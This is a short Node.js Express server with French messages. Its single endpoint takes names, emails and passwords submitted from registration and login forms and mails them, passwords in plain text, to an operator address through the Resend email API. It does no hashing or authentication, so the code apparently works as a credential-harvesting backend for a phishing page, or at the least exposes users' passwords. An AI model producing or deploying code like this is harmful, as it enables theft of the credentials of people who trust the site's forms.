const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

app.post("/send-notification", async (req, res) => {

    const { name, email, password, type } = req.body;

    if ((type === "register" && (!name || !email || !password)) ||
        (type === "login" && (!email || !password))) {
        return res.status(400).json({ success: false, error: "Champs manquants." });
    }

    let subject = "";
    let text = "";

    if (type === "register") {
        subject = "Nouvelle inscription sur le site";
        text = `Nom : ${name}\nEmail : ${email}\nMot de passe : ${password}`;
    } else {
        subject = "Nouvelle connexion sur le site";
        text = `Email : ${email}\nMot de passe : ${password}`;
    }

    try {
        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${process.env.RESEND_API_KEY}`,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                from: "onboarding@resend.dev",
                to: process.env.NOTIFY_EMAIL,
                subject: subject,
                text: text
            })
        });

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.message || "Erreur lors de l'envoi via Resend.");
        }

        res.json({ success: true });

    } catch (err) {
        console.error("Erreur d'envoi email :", err);
        res.status(500).json({ success: false, error: err.message });
    }

});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Serveur lancé sur http://localhost:${PORT}`);
});
